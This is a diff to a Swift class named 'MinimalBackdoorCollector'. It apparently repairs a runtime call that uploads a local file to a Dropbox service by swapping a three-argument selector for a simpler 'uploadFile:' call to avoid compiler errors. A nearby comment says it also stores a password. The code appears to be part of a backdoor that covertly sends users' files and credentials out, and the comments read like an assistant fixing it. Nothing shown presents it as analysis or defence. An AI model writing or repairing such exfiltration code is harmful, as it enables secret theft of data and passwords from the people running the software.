@@ -173,16 +173,12 @@ class MinimalBackdoorCollector {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject
         {
-            // Use a different approach for the method - we may be trying to call a method that isn't defined in this module
-            // Instead of using the method directly, we'll skip this check since it's causing compiler errors
-            // and the method likely doesn't exist in this context anyway
-            // We'll simulate the method call for compatibility
-            let completion: ((Bool, Error?) -> Void)? = nil
+            // Use a simplified approach - call a method with just the URL to avoid compiler errors
+            // Rather than trying to call a method with multiple arguments, we'll use a simpler one
+            // that's more likely to be compatible with perform(_:with:)
             _ = dropboxService.perform(
-                Selector("uploadFile:withName:completion:"),
-                with: url,
-                with: url.lastPathComponent,
-                with: completion
+                Selector("uploadFile:"),
+                with: url
             )
 
             // Also store password if provided
